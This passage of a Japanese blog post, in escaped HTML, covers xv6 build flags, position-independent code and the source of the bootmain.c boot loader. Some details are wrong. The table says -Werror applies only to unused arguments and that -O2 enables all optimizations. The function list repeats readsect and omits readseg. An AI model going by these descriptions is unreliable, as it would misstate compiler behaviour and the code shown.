&lt;td align=&quot;center&quot;&gt;-O2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;サポートされているすべての最適化オプションを有効化&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-Wall&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;すべてのコンパイラの警告メッセージを有効化&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-MD&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;システムヘッダーファイルとユーザーヘッダーファイルの両方を一覧&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-ggdb&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gdbを対象としたデバッグ情報を生成&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-m32&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;32bitオブジェクトとしてコンパイル&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-Werror&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;未使用の関数引数があった場合、コンパイルエラーとする&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-fno-omit-frame-pointer&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;フレームポインタを必要としない関数のレジスタにもフレームポインタを保持する&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&quot;メモ位置独立なコードpic&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E4%BD%8D%E7%BD%AE%E7%8B%AC%E7%AB%8B%E3%81%AA%E3%82%B3%E3%83%BC%E3%83%89pic&quot; aria-label=&quot;メモ位置独立なコードpic permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;メモ：位置独立なコード(PIC)&lt;/h3&gt;
&lt;p&gt;位置独立なコード(PIC)または位置独立実行形式(PIE)とは、メモリのどこに配置されても正しく実行できる機械語を指します。&lt;/p&gt;
&lt;p&gt;PICは主に共有ライブラリなどに利用されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Position Independent Code (PIC) in shared libraries - Eli Bendersky’s website&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;http://0xcc.net/blog/archives/000107.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Linux の共有ライブラリを作るとき PIC でコンパイルするのはなぜか - bkブログ&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;bootmaincの全体像&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#bootmainc%E3%81%AE%E5%85%A8%E4%BD%93%E5%83%8F&quot; aria-label=&quot;bootmaincの全体像 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;bootmain.cの全体像&lt;/h3&gt;
&lt;p&gt;xv6のビルドを行う際、まず初めに以下の&lt;code class=&quot;language-text&quot;&gt;bootmain.o&lt;/code&gt;から、&lt;code class=&quot;language-text&quot;&gt;bootmain.o&lt;/code&gt;が生成されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Boot loader.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Part of the boot block, along with bootasm.S, which calls bootmain().&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// bootasm.S has put the processor into protected 32-bit mode.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// bootmain() loads an ELF kernel image from the disk starting at&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// sector 1 and then jumps to the kernel entry routine.&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;types.h&quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;elf.h&quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;x86.h&quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;memlayout.h&quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;SECTSIZE&lt;/span&gt;  &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;512&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;readseg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uint&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;bootmain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;elfhdr&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;elf&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;proghdr&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;ph&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;eph&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;entry&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; pa&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  elf &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;elfhdr&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// scratch space&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Read 1st page off disk&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;readseg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;elf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Is this an ELF executable?&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;magic &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; ELF_MAGIC&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// let bootasm.S handle error&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Load each program segment (ignores ph flags).&lt;/span&gt;
  ph &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;proghdr&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;elf &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phoff&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  eph &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ph &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phnum&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; ph &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; eph&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    pa &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;paddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;readseg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pa&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;off&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;memsz &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;stosb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pa &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;memsz &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Call the entry point from the ELF header.&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// Does not return!&lt;/span&gt;
  entry &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;entry&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;waitdisk&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// Wait for disk ready.&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;inb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F7&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xC0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Read a single sector at offset into dst.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;readsect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;dst&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uint offset&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// Issue command.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;waitdisk&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// count = 1&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; offset&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; offset &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; offset &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;offset &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xE0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F7&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// cmd 0x20 - read sectors&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Read data.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;waitdisk&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;insl&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; dst&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; SECTSIZE&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Read &apos;count&apos; bytes at &apos;offset&apos; from kernel into physical address &apos;pa&apos;.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Might copy more than asked.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;readseg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; pa&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uint count&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uint offset&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; epa&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  epa &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; pa &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; count&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Round down to sector boundary.&lt;/span&gt;
  pa &lt;span class=&quot;token operator&quot;&gt;-=&lt;/span&gt; offset &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; SECTSIZE&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Translate from bytes to sectors; kernel starts at sector 1.&lt;/span&gt;
  offset &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;offset &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; SECTSIZE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// If this is too slow, we could read lots of sectors at a time.&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// We&apos;d write more to memory than asked, but it doesn&apos;t matter --&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// we load in increasing order.&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; pa &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; epa&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; pa &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; SECTSIZE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; offset&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;readsect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pa&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; offset&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;定義されている関数は以下の4つです。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;void bootmain(void)&lt;/li&gt;
&lt;li&gt;void waitdisk(void)&lt;/li&gt;
&lt;li&gt;void readsect(void *dst, uint offset)&lt;/li&gt;
&lt;li&gt;void readsect(void *dst, uint offset)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;各関数の挙動については後で追っていきます。&lt;/p&gt;
